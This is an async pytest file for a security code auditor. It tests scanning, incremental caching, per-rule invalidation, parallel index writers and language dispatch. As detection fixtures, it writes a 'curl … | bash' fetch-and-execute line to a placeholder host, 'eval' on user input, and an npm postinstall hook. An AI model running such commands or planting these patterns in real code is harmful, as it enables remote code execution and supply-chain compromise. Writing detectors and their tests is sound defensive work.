"""Scan engine + per-rule incremental cache + parallel-writer safety (async)."""

import asyncio
from pathlib import Path

from auditor.config import load_config
from auditor.engine import ScanEngine
from auditor.index import IndexStore


def _make_repo(tmp_path: Path) -> Path:
    (tmp_path / "pyproject.toml").write_text(
        '[project]\nname = "x"\nversion = "0"\ndependencies = ["pydantic"]\n'
        '[tool.auditor]\nextends = "base"\n'
    )
    (tmp_path / ".auditor").mkdir()
    pkg = tmp_path / "pkg"
    pkg.mkdir()
    (pkg / "a.py").write_text("def f(x):\n    eval(x)\n    return x\n")
    (pkg / "b.py").write_text("def g(y):\n    return y\n")
    return tmp_path


async def _scan_dir(root: Path, target: Path, settings, index) -> dict:
    results = await ScanEngine.for_target(
        target, settings=settings, index=index
    ).scan_path(target)
    return {r.file: r for r in results}


async def test_stateless_scan_no_db(tmp_path):
    root = _make_repo(tmp_path)
    res = await ScanEngine.for_target(root / "pkg" / "a.py").scan_file(
        root / "pkg" / "a.py"
    )
    assert "PY-SEC-DANGEROUS-EVAL" in {f.rule_id for f in res.findings}
    assert not (root / ".auditor" / "index.db").exists()
    assert res.cached is False


async def test_incremental_cache_reuses_unchanged(tmp_path):
    root = _make_repo(tmp_path)
    settings = load_config(root)
    db = root / ".auditor" / "index.db"

    async with await IndexStore.connect(db) as index:
        first = await _scan_dir(root, root / "pkg", settings, index)
        assert all(r.cached is False for r in first.values())

    # Re-scan with no edits: everything served from cache.
    async with await IndexStore.connect(db) as index:
        second = await _scan_dir(root, root / "pkg", settings, index)
        assert all(r.cached for r in second.values())

    # Edit one file: only it re-parses; the other stays cached.
    (root / "pkg" / "a.py").write_text("def f(x):\n    return x\n")
    async with await IndexStore.connect(db) as index:
        third = await _scan_dir(root, root / "pkg", settings, index)
        assert third["pkg/a.py"].cached is False
        assert third["pkg/b.py"].cached is True
        assert "PY-SEC-DANGEROUS-EVAL" not in {
            f.rule_id for f in third["pkg/a.py"].findings
        }


async def test_per_rule_invalidation(tmp_path):
    root = _make_repo(tmp_path)
    db = root / ".auditor" / "index.db"
    settings = load_config(root)
    async with await IndexStore.connect(db) as index:
        await _scan_dir(root, root / "pkg", settings, index)

    # Lower a threshold for one rule via config; only that rule should re-run.
    (root / ".auditor" / "config.toml").write_text(
        'extends = "base"\n[rules]\nPY-STYLE-FILE-SIZE = { threshold = { size = { file_max_lines = 1 } } }\n'
    )
    settings2 = load_config(root)
    async with await IndexStore.connect(db) as index:
        res = await _scan_dir(root, root / "pkg", settings2, index)
    assert "PY-STYLE-FILE-SIZE" in {f.rule_id for f in res["pkg/b.py"].findings}


async def test_parallel_writers(tmp_path):
    root = _make_repo(tmp_path)
    settings = load_config(root)
    db = root / ".auditor" / "index.db"
    files = [root / "pkg" / "a.py", root / "pkg" / "b.py"]

    async def worker(p: Path) -> int:
        async with await IndexStore.connect(db) as index:
            res = await ScanEngine.for_target(
                p, settings=settings, index=index
            ).scan_file(p)
            return len(res.findings)

    results = await asyncio.gather(*[worker(p) for p in files * 4])
    assert all(isinstance(n, int) for n in results)
    async with await IndexStore.connect(db) as index:
        assert len(await index.files()) == 2


async def test_scan_dispatches_each_language(tmp_path):
    """Discovery + dispatch route every language through the engine: a `.py` (by suffix), a `.sh`
    (by suffix), and a `package.json` (by filename) each reach their auditor and surface their
    representative rule. Also exercises the engine's rule-id pre-filter for shell/manifest."""
    root = tmp_path
    (root / "pyproject.toml").write_text(
        '[project]\nname = "x"\nversion = "0"\n[tool.auditor]\nextends = "base"\n'
    )
    (root / ".auditor").mkdir()
    src = root / "src"
    src.mkdir()
    (src / "a.py").write_text("eval(user_input)\n")
    (src / "deploy.sh").write_text("curl http://example.invalid/x.sh | bash\n")
    (src / "package.json").write_text('{"scripts": {"postinstall": "node x.js"}}\n')

    settings = load_config(root)
    async with await IndexStore.connect(root / ".auditor" / "index.db") as index:
        results = await _scan_dir(root, src, settings, index)

    langs = {f: r.language for f, r in results.items()}
    assert langs == {
        "src/a.py": "python",
        "src/deploy.sh": "shell",
        "src/package.json": "manifest",
    }
    assert "PY-SEC-DANGEROUS-EVAL" in {f.rule_id for f in results["src/a.py"].findings}
    assert "SH-MAL-CURL-BASH" in {f.rule_id for f in results["src/deploy.sh"].findings}
    assert "MF-SUPPLY-INSTALL-HOOK" in {
        f.rule_id for f in results["src/package.json"].findings
    }
